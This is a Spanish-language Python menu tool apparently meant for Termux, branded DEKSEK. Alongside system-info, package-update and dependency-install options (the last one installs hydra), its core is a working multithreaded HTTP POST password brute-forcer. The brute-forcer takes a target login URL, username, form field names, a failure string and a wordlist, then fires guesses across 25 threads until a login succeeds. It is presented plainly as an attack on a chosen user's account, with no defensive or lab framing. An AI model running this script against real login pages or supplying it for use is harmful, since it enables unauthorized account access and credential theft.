#!/usr/bin/env python
import os
import sys
import time
import threading
import requests
from queue import Queue

# ================= COLORES =================
VERDE = '\033[0;32m'
NC = '\033[0m'
ROJO = '\033[0;31m'
AMARILLO = '\033[0;33m'
AZUL = '\033[0;34m'

# ================= PANTALLA DE CARGA =================
def loading_screen():
    os.system('clear')
    print(f"{AMARILLO}Iniciando el sistema...{NC}\n")
    
    total_pasos = 40
    for i in range(total_pasos + 1):
        barras = '#' * i
        espacios = ' ' * (total_pasos - i)
        porcentaje = int((i * 100) / total_pasos)
        print(f"Cargando DEKSEK [{barras}{espacios}] \\ ({porcentaje}%)")
        time.sleep(0.04)  # Un poco más rápido para no esperar de más
    
    print(f"\n{VERDE}¡Carga completada con éxito!{NC}")
    time.sleep(1)

# ================= BANNER DEKSEK =================
def banner():
    os.system('clear')
    print(f"{VERDE}")
    print("  ██████╗ ███████╗██╗  ██╗███████╗███████╗██╗  ██╗")
    print("  ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔════╝██║ ██╔╝")
    print("  ██║  ██║█████╗  █████═╝ ███████╗█████╗  █████═╝ ")
    print("  ██║  ██║██╔══╝  ██╔═██╗ ╚════██║██╔══╝  ██╔═██╗ ")
    print("  ██████╔╝███████╗██║  ██╗███████║███████╗██║  ██╗")
    print("  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝")
    print(f"{NC}")

# ================= CONFIG BRUTE FORCE =================
THREADS = 25          # En Termux: 15-30 máximo
DELAY = 0.3

found = False
lock = threading.Lock()

# ================= LÓGICA DE FUERZA BRUTA =================
def worker(q, target_url, username, password_field, username_field, failure_trigger):
    global found
    while not q.empty() and not found:
        password = q.get()
        payload = {username_field: username, password_field: password}
        
        try:
            # Realiza la petición POST
            response = requests.post(target_url, data=payload, timeout=5)
            
            # Si el texto de fallo NO está en la respuesta, asumimos éxito
            if failure_trigger not in response.text:
                with lock:
                    if not found:
                        found = True
                        print(f"\n{VERDE}[+] ¡PASSWORD ENCONTRADA!: {password}{NC}\n")
            else:
                print(f"{ROJO}[-] Probando: {password}{NC}")
                
            time.sleep(DELAY)
        except requests.exceptions.RequestException:
            print(f"{AMARILLO}[!] Error de conexión con el objetivo.{NC}")
            
        q.task_done()

def brute_force_menu():
    global found
    found = False
    banner()
    print(f"{AMARILLO}=== ATAQUE DE FUERZA BRUTA (HTTP POST) ==={NC}\n")
    
    target_url = input(f"{AZUL}Introduce la URL objetivo (ej: http://127.0.0.1/login): {NC}")
    username = input(f"{AZUL}Introduce el usuario a atacar: {NC}")
    username_field = input(f"{AZUL}Nombre del campo usuario (ej: 'username' o 'user'): {NC}")
    password_field = input(f"{AZUL}Nombre del campo password (ej: 'password' o 'pass'): {NC}")
    failure_trigger = input(f"{AZUL}Texto que sale cuando el login falla (ej: 'Incorrecto'): {NC}")
    wordlist_path = input(f"{AZUL}Ruta del diccionario (ej: wordlist.txt): {NC}")
    
    # Comprobar si la wordlist existe
    if not os.path.exists(wordlist_path):
        print(f"\n{ROJO}[X] Error: El archivo de diccionario no existe.{NC}")
        input(f"\n{VERDE}Presiona Enter para volver...{NC}")
        return

    # Cargar contraseñas en la cola (Queue)
    q = Queue()
    with open(wordlist_path, 'r', errors='ignore') as f:
        for line in f:
            q.put(line.strip())
            
    print(f"\n{AMARILLO}[*] Iniciando ataque con {THREADS} hilos...{NC}\n")
    time.sleep(1)
    
    # Crear e iniciar hilos
    threads_list = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(q, target_url, username, password_field, username_field, failure_trigger))
        t.daemon = True
        t.start()
        threads_list.append(t)
        
    # Esperar a que la cola se vacíe
    for t in threads_list:
        t.join()
        
    if not found:
        print(f"\n{ROJO}[-] El ataque terminó sin encontrar la contraseña.{NC}")
        
    input(f"\n{VERDE}Presiona Enter para continuar...{NC}")

def menu():
    banner()
    print(f"{AZUL}1. Ver información del sistema")
    print("2. Hacer actualización rápida")
    print("3. Ataques de Fuerza Bruta (Python)")
    print("4. Instalar dependencias + scripts")
    print("5. Salir")
    print(f"{NC}")
    choice = input(f"{VERDE}Selecciona una opción [1-5]: {NC}")
    return choice

# ====================== OPCIONES ======================

def system_info():
    banner()
    print(f"{AMARILLO}=== INFORMACIÓN DEL SISTEMA ==={NC}")
    os.system("uname -a && whoami && uptime")
    print(f"Python: {sys.version.split()[0]}")
    input(f"\n{VERDE}Presiona Enter para continuar...{NC}")

def update():
    banner()
    print(f"{AMARILLO}Actualizando paquetes...{NC}")
    os.system("pkg update && pkg upgrade -y")
    input(f"\n{VERDE}Presiona Enter para continuar...{NC}")

def install_deps():
    banner()
    print(f"{AMARILLO}Instalando dependencias...{NC}")
    os.system("pkg install python git wget curl hydra -y")
    os.system("pip install requests")
    print(f"{VERDE}✅ Dependencias instaladas.{NC}")
    input(f"\n{VERDE}Presiona Enter para continuar...{NC}")

# ==================== BUCLE PRINCIPAL ====================
if __name__ == "__main__":
    loading_screen()
    
    while True:
        opcion = menu()
        if opcion == "1":
            system_info()
        elif opcion == "2":
            update()
        elif opcion == "3":
            brute_force_menu()
        elif opcion == "4":
            install_deps()
        elif opcion == "5":
            print(f"{ROJO}Saliendo... ¡Hasta luego!{NC}")
            break
        else:
            print(f"{ROJO}Opción no válida.{NC}")
            time.sleep(1.5)

